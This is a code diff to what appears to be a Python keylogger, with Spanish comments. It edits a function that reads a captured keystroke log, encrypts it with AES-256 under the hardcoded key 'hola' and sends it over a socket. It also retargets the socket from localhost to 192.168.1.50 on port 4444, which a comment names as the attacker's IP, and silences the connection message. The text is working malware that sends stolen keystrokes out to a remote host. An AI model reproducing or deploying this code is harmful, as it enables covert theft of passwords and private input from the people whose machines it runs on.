@@ -44,8 +44,10 @@ def capturaTeclado(event):
 def enviarMensaje():  
     # abre archivo log
     file = open(archivoLog, "r")
+    # transforma el dict que resultado de la encriptación con AES-256, a json y el json a str,
+    mensajeEncriptado = json.dumps(encriptar(file.read(), "hola")).encode()
     # Envia el mensaje encriptado a traves del socket
-    sock.sendall(json.dumps(encriptar(file.read(), "hola")).encode())
+    sock.sendall(mensajeEncriptado)
     # cierra el archivo log
     file.close()
     # abre el archivo log para vaciar el contenido.
@@ -87,8 +89,8 @@ archivoLog = os.environ.get(
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # conecta el socket al puerto 4444 y a la ip del atacante
-direccionServidor = ('127.0.0.1', 4444)
-print('conectando a {} por el puerto {}'.format(*direccionServidor))
+direccionServidor = ('192.168.1.50', 4444)
+#print('conectando a {} por el puerto {}'.format(*direccionServidor))
 sock.connect(direccionServidor)
 
 # Se define el objecto que maneja las capturas de eventos como mouse o teclado
